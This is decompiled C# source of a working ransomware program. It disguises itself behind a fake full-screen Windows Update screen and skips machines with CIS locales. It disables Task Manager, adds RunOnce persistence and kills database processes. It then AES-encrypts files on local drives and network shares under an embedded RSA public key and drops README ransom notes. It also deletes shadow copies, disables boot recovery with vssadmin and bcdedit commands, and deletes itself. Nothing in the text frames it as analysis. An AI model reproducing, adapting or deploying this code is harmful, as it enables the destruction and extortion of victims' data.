using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Trinet.Networking;
using osilokinom.Properties;

namespace osilokinom;

public class Form1 : Form
{
	private DriveInfo[] driveInfo_0;

	private string string_0;

	private string string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private string string_5;

	private DateTime dateTime_0;

	private string string_6;

	private static bool bool_0;

	private string string_7;

	private string string_8;

	private static Encoding encoding_0;

	private string string_9;

	private string[] string_10;

	private bool OqFbaNcXs;

	private IContainer icontainer_0;

	private Label label1;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint uint_0, uint uint_1, string string_11, uint uint_2);

	public Form1()
	{
		Class3.QNpOt4wzFfcSE();
		driveInfo_0 = DriveInfo.GetDrives();
		string_0 = RandomRansom(7);
		string_1 = Environment.MachineName.ToString();
		string_2 = Environment.UserName;
		string_3 = Guid.NewGuid().ToString();
		string_5 = "blut4";
		dateTime_0 = DateTime.Now;
		string_9 = Path.GetTempPath() + "backup//";
		string_10 = new string[72]
		{
			".mdf", ".db", ".mdb", ".sql", ".pdb", ".pdb", ".pdb", ".dsk", ".fp3", ".fdb",
			".accdb", ".dbf", ".crd", ".db3", ".dbk", ".nsf", ".gdb", ".abs", ".sdb", ".sdb",
			".sdb", ".sqlitedb", ".edb", ".sdf", ".sqlite", ".dbs", ".cdb", ".cdb", ".cdb", ".bib",
			".dbc", ".usr", ".dbt", ".rsd", ".myd", ".pdm", ".ndf", ".ask", ".udb", ".ns2",
			".kdb", ".ddl", ".sqlite3", ".odb", ".ib", ".db2", ".rdb", ".wdb", ".tcx", ".emd",
			".sbf", ".accdr", ".dta", ".rpd", ".btr", ".vdb", ".daf", ".dbv", ".fcd", ".accde",
			".mrg", ".nv2", ".pan", ".dnc", ".dxl", ".tdt", ".accdc", ".eco", ".fmp", ".vpd",
			".his", ".fid"
		};
		OqFbaNcXs = true;
		((Form)this)._002Ector();
		InitializeComponent();
	}

	private void method_0(object sender, EventArgs e)
	{
	}

	private void method_1()
	{
		Random random = new Random();
		int millisecondsTimeout = random.Next(5000, 30000);
		Thread.Sleep(millisecondsTimeout);
		go();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = OqFbaNcXs;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string processName = Process.GetCurrentProcess().ProcessName;
		int num = 0;
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (!process.ProcessName.Contains(processName))
			{
				continue;
			}
			num++;
			if (num > 1)
			{
				try
				{
					Environment.Exit(0);
					((Form)this).Close();
					Application.Exit();
				}
				catch
				{
				}
			}
		}
		((Control)this).set_BackColor(ColorTranslator.FromHtml("#07466c"));
		updating();
		Thread thread = new Thread(method_1);
		thread.Start();
	}

	public void go()
	{
		string[] source = new string[6] { "ru", "uk", "kk", "ky", "hy", "ka" };
		string text = method_2();
		string value = TruncateLongString(text, 2);
		if (source.Contains(value))
		{
			SelfDelete();
			Environment.Exit(0);
			((Form)this).Close();
			Application.Exit();
		}
		string text2 = smethod_0();
		string processName = Process.GetCurrentProcess().ProcessName;
		string s = string.Concat(text, "_", string_0, "_", string_2, "_", dateTime_0, "_", text2, "_", string_5, "_", processName);
		KillCtrlAltDelete();
		Autorun();
		string text3 = CreatePassword(32);
		string_7 = "<RSAKeyValue><Modulus>jjIzw0NO0utBI5EdZBPUDk4oHkLbwDkNmrN8eL62EvI/HfXnfPNQpbOaw5Q/wHNNDJFSUnaznOMNeznr+D6d6kom3cszkJkk4hRairf4N0in+Ogtx+EPweiyE2Mpc3tcxja4rdwlez0rWga5KAh+zxO/CVJQaxkGc2BSqrwyeKRcAMoTBPSitApaQFL4si5ZieSRcvjdjgW4zhCohRGjtj0Dd6qf8/kZZIVZsWIqaosMNOLyL7n7vfmmEA83O3Fllw0PUDnZZwE7jaJhtkrAQox+qPeA/mEKCkUMSEBRnZ5v8PSD5cZdnY0wl3leQot5xKT23QGY6w84vmgXW6nvdQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
		string_8 = EncryptTextRSA(text3, 2048, string_7);
		byte[] bytes = Encoding.UTF8.GetBytes(s);
		string_6 = Convert.ToBase64String(bytes);
		string text4 = string_6.Replace("=", "");
		string text5 = string_8.Replace("=", "+");
		string_8 = text5 + text4;
		string[] array = new string[1] { ".lnk" };
		DriveInfo[] array2 = driveInfo_0;
		foreach (DriveInfo driveInfo in array2)
		{
			try
			{
				lockdir(driveInfo.RootDirectory.ToString(), text3, array);
			}
			catch (IOException)
			{
			}
		}
		method_3(text3, array);
		KillAutorun();
		DelBack();
		text3 = null;
		OqFbaNcXs = false;
		((Form)this).Close();
		SelfDelete();
		Application.Exit();
	}

	public static string TruncateLongString(string inputString, int maxChars)
	{
		if (maxChars <= 0)
		{
			throw new ArgumentOutOfRangeException("maxChars");
		}
		if (inputString != null && inputString.Length >= maxChars)
		{
			return inputString.Substring(0, maxChars);
		}
		return inputString;
	}

	public static int GetInt(RNGCryptoServiceProvider rnd, int max)
	{
		byte[] array = new byte[4];
		int num;
		do
		{
			rnd.GetBytes(array);
			num = BitConverter.ToInt32(array, 0) & 0x7FFFFFFF;
		}
		while (num >= max * (int.MaxValue / max));
		return num % max;
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		using (RNGCryptoServiceProvider rnd = new RNGCryptoServiceProvider())
		{
			while (length-- > 0)
			{
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!="[GetInt(rnd, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!=".Length)]);
			}
		}
		return stringBuilder.ToString();
	}

	public static string RandomRansom(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		using (RNGCryptoServiceProvider rnd = new RNGCryptoServiceProvider())
		{
			while (length-- > 0)
			{
				stringBuilder.Append("1234567890"[GetInt(rnd, "1234567890".Length)]);
			}
		}
		return stringBuilder.ToString();
	}

	[SpecialName]
	private string method_2()
	{
		return CultureInfo.CurrentCulture.Name;
	}

	private void method_3(string string_11, string[] string_12)
	{
		try
		{
			NetworkBrowser networkBrowser = new NetworkBrowser();
			foreach (string networkComputer in networkBrowser.getNetworkComputers())
			{
				if (networkComputer == null || networkComputer.Trim().Length <= 0)
				{
					continue;
				}
				ShareCollection shares = ShareCollection.GetShares(networkComputer);
				if (shares == null)
				{
					continue;
				}
				foreach (Share item in shares)
				{
					if (item.ShareType == ShareType.Disk)
					{
						string text2 = item.ToString();
						if (Enumerable.Contains(text2, '\\'))
						{
							lockdir(text2, string_11, string_12);
						}
					}
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private void method_4(string string_11)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(string_11);
	}

	public byte[] AES_Encrypt1(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.Padding = PaddingMode.None;
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public byte[] AES_Encrypt2(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public void lockdir(string location, string password, string[] words)
	{
		string[] files = Directory.GetFiles(location);
		string[] directories = Directory.GetDirectories(location);
		if (location.Contains("WINDOWS") || location.Contains("RECYCLER") || location.Contains("Program Files") || location.Contains("Program Files (x86)") || location.Contains("Windows") || location.Contains("Recycle.Bin") || location.Contains("RECYCLE.BIN") || location.Contains("Recycler") || location.Contains("TEMP") || location.Contains("APPDATA") || location.Contains("AppData") || location.Contains("Temp") || location.Contains("ProgramData") || location.Contains("Microsoft") || location.Contains("Burn"))
		{
			return;
		}
		for (int i = 0; i < files.Length; i++)
		{
			try
			{
				string extension = Path.GetExtension(files[i]);
				string text = null;
				using (FileStream fileStream = File.Open(files[i], FileMode.Open, FileAccess.Read))
				{
					byte[] array = new byte[10];
					fileStream.Position = fileStream.Length - array.Length;
					fileStream.Read(array, 0, array.Length);
					text = encoding_0.GetString(array);
				}
				if (words.Contains(extension) || files[i].Contains("README_"))
				{
					continue;
				}
				if (text.Contains("###"))
				{
					string value = text.Replace("###", "");
					try
					{
						Convert.ToInt32(value);
					}
					catch (Exception)
					{
						LockFile(files[i], password);
					}
				}
				else
				{
					LockFile(files[i], password);
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (Exception)
			{
			}
		}
		for (int j = 0; j < directories.Length; j++)
		{
			try
			{
				lockdir(directories[j], password, words);
				WriteInfo(directories[j], password);
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (Exception)
			{
			}
		}
	}

	public void LockFile(string file, string password)
	{
		method_5();
		FileInfo fileInfo = new FileInfo(file);
		long length = fileInfo.Length;
		string extension = Path.GetExtension(file);
		if (length >= 1048576L && !string_10.Contains(extension))
		{
			AES_Encrypt(file, password);
			return;
		}
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt2(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		string_4 = Path.GetFileName(file);
		byte[] bytes3 = Encoding.UTF8.GetBytes(string_4);
		string text = Convert.ToBase64String(bytes3);
		string directoryName = fileInfo.DirectoryName;
		byte[] bytes4 = Encoding.Default.GetBytes("###" + string_0);
		using (FileStream fileStream = new FileStream(file, FileMode.Append, FileAccess.Write))
		{
			fileStream.Write(bytes4, 0, bytes4.Length);
			fileStream.Flush();
			fileStream.Close();
		}
		File.Move(file, directoryName + "/" + text);
	}

	public void AES_Encrypt(string file, string password)
	{
		byte[] array = new byte[1048576];
		try
		{
			using FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read);
			fileStream.Read(array, 0, array.Length);
			fileStream.Close();
		}
		catch (UnauthorizedAccessException)
		{
		}
		try
		{
			using FileStream fileStream2 = new FileStream(file, FileMode.Open, FileAccess.Write);
			byte[] bytesToBeEncrypted = array;
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] array2 = AES_Encrypt1(bytesToBeEncrypted, bytes);
			fileStream2.Write(array2, 0, array2.Length);
			fileStream2.Close();
		}
		catch (UnauthorizedAccessException)
		{
		}
		FileInfo fileInfo = new FileInfo(file);
		string_4 = Path.GetFileName(file);
		byte[] bytes2 = Encoding.UTF8.GetBytes(string_4);
		string text = Convert.ToBase64String(bytes2);
		string directoryName = fileInfo.DirectoryName;
		byte[] bytes3 = Encoding.Default.GetBytes("###" + string_0);
		using (FileStream fileStream3 = new FileStream(file, FileMode.Append, FileAccess.Write))
		{
			fileStream3.Write(bytes3, 0, bytes3.Length);
			fileStream3.Flush();
			fileStream3.Close();
		}
		File.Move(file, directoryName + "/" + text);
	}

	public void WriteInfo(string path, string password)
	{
		Random random = new Random();
		string text = random.Next(100, 999999).ToString();
		string text2 = RandomRansom(9);
		string newValue = text + text2;
		string text3 = Resources.smethod_0();
		text3 = text3.Replace("$userNameG", string_3);
		text3 = text3.Replace("$iraqs", newValue);
		text3 = text3.Replace("$userName", string_2);
		text3 = text3.Replace("$encryptedPassword", string_8);
		RandomRansom(5);
		File.WriteAllText(path + "\\README_" + string_0 + ".txt", text3);
	}

	private static string smethod_0()
	{
		string name = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
		using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
		if (registryKey != null)
		{
			try
			{
				string text = registryKey.GetValue("ProductName")!.ToString();
				if (text == "")
				{
					return "null";
				}
				if (text.Contains("XP"))
				{
					return "XP";
				}
				if (text.Contains("7"))
				{
					return "Win 7";
				}
				if (text.Contains("2003"))
				{
					return "Serv 2003";
				}
				if (text.Contains("8"))
				{
					if (text.Contains("2008"))
					{
						return "Serv 2008";
					}
					return "Win 8";
				}
				if (text.Contains("10"))
				{
					return "Win 10";
				}
				if (text.Contains("2012"))
				{
					return "Serv 2012";
				}
				if (text.Contains("2016"))
				{
					return "Serv 2016";
				}
				if (text.Contains("Server"))
				{
					return "Serv";
				}
				return "Unknow";
			}
			catch (Exception ex)
			{
				return ex.Message;
			}
		}
		return "Null";
	}

	public void KillCtrlAltDelete()
	{
		string value = "1";
		string subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(subkey);
			registryKey.SetValue("DisableTaskMgr", value);
			registryKey.Close();
		}
		catch (Exception)
		{
		}
	}

	public static string EncryptTextRSA(string text, int keySize, string publicKeyXml)
	{
		byte[] inArray = smethod_1(Encoding.UTF8.GetBytes(text), keySize, publicKeyXml);
		return Convert.ToBase64String(inArray);
	}

	public static byte[] smethod_1(byte[] data, int keySize, string publicKeyXml)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(keySize);
		rSACryptoServiceProvider.FromXmlString(publicKeyXml);
		return rSACryptoServiceProvider.Encrypt(data, bool_0);
	}

	public void Autorun()
	{
		string text = Path.GetTempPath() + "Adobe//";
		try
		{
			if (!Directory.Exists(string_9))
			{
				DirectoryInfo directoryInfo = Directory.CreateDirectory(text);
				directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
			}
		}
		catch
		{
		}
		string location = Assembly.GetExecutingAssembly().Location;
		string fileName = Path.GetFileName(location);
		try
		{
			File.Copy(location, Path.Combine(text, fileName), overwrite: false);
		}
		catch
		{
		}
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\");
		string text2 = Path.GetTempPath() + "Adobe";
		registryKey.SetValue(fileName, text2 + "\\" + fileName);
		registryKey.Close();
	}

	public void KillAutorun()
	{
		string name = "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce";
		string location = Assembly.GetExecutingAssembly().Location;
		string fileName = Path.GetFileName(location);
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			if (registryKey != null)
			{
				registryKey.DeleteValue(fileName);
				Registry.CurrentUser.DeleteSubKey(fileName);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			string path = Path.GetTempPath() + "Adobe\\";
			Directory.Delete(path, recursive: true);
		}
		catch (Exception)
		{
		}
	}

	public void updating()
	{
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Expected O, but got Unknown
		_003C_003Ec__DisplayClass2 CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass2();
		CS_0024_003C_003E8__locals0._003C_003E4__this = this;
		CS_0024_003C_003E8__locals0.timeinstall = 1;
		((Control)label1).set_Text("Configuring critical Windows Updates" + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + CS_0024_003C_003E8__locals0.timeinstall + "% complete" + Environment.NewLine + "Do not turn off your computer.");
		Timer val = new Timer();
		val.set_Interval(100000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			CS_0024_003C_003E8__locals0.timeinstall++;
			if (CS_0024_003C_003E8__locals0.timeinstall < 100)
			{
				((Control)CS_0024_003C_003E8__locals0._003C_003E4__this.label1).set_Text("Configuring critical Windows Updates" + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + CS_0024_003C_003E8__locals0.timeinstall + "% complete" + Environment.NewLine + "Do not turn off your computer.");
			}
		});
		val2.Start();
	}

	private void method_5()
	{
		List<string> list = new List<string>();
		list.Add("taskmgr");
		list.Add("sqlagent");
		list.Add("winword");
		list.Add("sqlbrowser");
		list.Add("sqlservr");
		list.Add("sqlwriter");
		list.Add("oracle");
		list.Add("ocssd");
		list.Add("dbsnmp");
		list.Add("synctime");
		list.Add("mydesktopqos");
		list.Add("agntsvc.exeisqlplussvc");
		list.Add("xfssvccon");
		list.Add("mydesktopservice");
		list.Add("ocautoupds");
		list.Add("agntsvc.exeagntsvc");
		list.Add("agntsvc.exeencsvc");
		list.Add("firefoxconfig");
		list.Add("tbirdconfig");
		list.Add("ocomm");
		list.Add("mysqld");
		list.Add("sql");
		list.Add("mysqld-nt");
		list.Add("mysqld-opt");
		list.Add("dbeng50");
		list.Add("sqbcoreservice");
		List<string> list2 = list;
		Process[] processes = Process.GetProcesses();
		try
		{
			Process[] array = processes;
			foreach (Process process in array)
			{
				foreach (string item in list2)
				{
					if (process.ProcessName.ToLower().Contains(item.ToLower()))
					{
						process.Kill();
					}
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public void SelfDelete()
	{
		string executablePath = Application.get_ExecutablePath();
		StreamWriter streamWriter = new StreamWriter("update.bat");
		streamWriter.WriteLine("@echo off");
		streamWriter.WriteLine("ping -n 1 -w 5000 10.10.254.254 >nul");
		streamWriter.WriteLine("del \"" + executablePath + "\"");
		streamWriter.WriteLine("del %0");
		streamWriter.Close();
		Process.Start("update.bat");
		Application.Exit();
	}

	public void DelBack()
	{
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
		bool flag = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "delback.bat");
		string contents = "vssadmin delete shadows /all /quiet & bcdedit.exe /set {default} recoveryenabled no & bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures";
		File.WriteAllText(text, contents, Encoding.Default);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Verb = "runas";
		processStartInfo.FileName = text;
		if (!flag)
		{
			try
			{
				Process.Start(processStartInfo);
				return;
			}
			catch (Win32Exception)
			{
				return;
			}
		}
		try
		{
			Process.Start(processStartInfo);
		}
		catch (Win32Exception)
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		label1 = new Label();
		((Control)this).SuspendLayout();
		((Control)label1).set_Anchor((AnchorStyles)15);
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_Font(new Font("Segoe UI Light", 20.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label1).set_ForeColor(SystemColors.ButtonFace);
		label1.set_Image((Image)(object)Resources.smethod_1());
		((Control)label1).set_Location(new Point(417, 278));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(362, 106));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("\"Multi-line \\r\\nlabel\"");
		label1.set_TextAlign((ContentAlignment)32);
		((Control)label1).set_UseWaitCursor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_AutoSize(true);
		((Form)this).set_ClientSize(new Size(1264, 681));
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Form1");
		((Form)this).set_TopMost(true);
		((Control)this).set_UseWaitCursor(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	static Form1()
	{
		Class3.QNpOt4wzFfcSE();
		bool_0 = false;
		encoding_0 = Encoding.UTF8;
	}
}
